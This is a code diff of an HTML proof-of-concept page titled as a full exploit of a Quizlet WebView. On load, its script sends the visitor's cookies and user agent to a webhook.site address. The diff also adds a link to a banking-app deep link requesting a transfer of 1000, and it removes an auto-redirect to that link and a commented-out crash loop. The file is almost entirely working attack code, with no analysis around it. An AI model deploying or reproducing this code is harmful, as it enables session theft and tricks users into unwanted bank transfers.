@@ -1,20 +1,14 @@
 <html>
   <body>
     <h1>Quizlet WebView Full Exploit PoC</h1>
+    <p><a href="deeplink://com.bank.app/transfer?amount=1000">Click here to open bank app</a></p>
+
     <script>
-      // 1. Steal cookies/session
+      // 1. Steal cookies
       fetch('https://webhook.site/c9b4b61b-a148-485e-9b8a-66c16d1e1706/steal?c=' + encodeURIComponent(document.cookie));
 
-      // 2. Fingerprint device
+      // 2. Fingerprint
       fetch('https://webhook.site/c9b4b61b-a148-485e-9b8a-66c16d1e1706/fp?ua=' + encodeURIComponent(navigator.userAgent));
-
-      // 3. Trigger deep link to open another app (e.g., banking app, Play Store)
-      setTimeout(function() {
-        location.href = 'deeplink://com.bank.app/transfer?amount=1000';
-      }, 2000);
-
-      // 4. Crash the app (DoS)
-      // setTimeout(function() { while(1){} }, 5000);
     </script>
   </body>
 </html>
